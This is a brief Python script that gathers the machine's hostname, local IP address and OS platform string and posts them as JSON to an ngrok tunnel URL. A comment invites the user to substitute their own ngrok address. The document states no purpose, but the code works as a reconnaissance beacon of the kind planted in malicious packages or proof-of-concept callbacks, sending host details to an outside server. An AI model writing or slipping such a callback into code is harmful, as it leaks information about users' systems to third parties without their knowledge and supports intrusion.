import socket
import requests
import platform

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
os_info = platform.platform()

# Replace with YOUR ngrok HTTPS URL
requests.post("https://da19f75c3041.ngrok-free.app", json={
    "hostname": hostname,
    "ip": ip,
    "platform": os_info
})
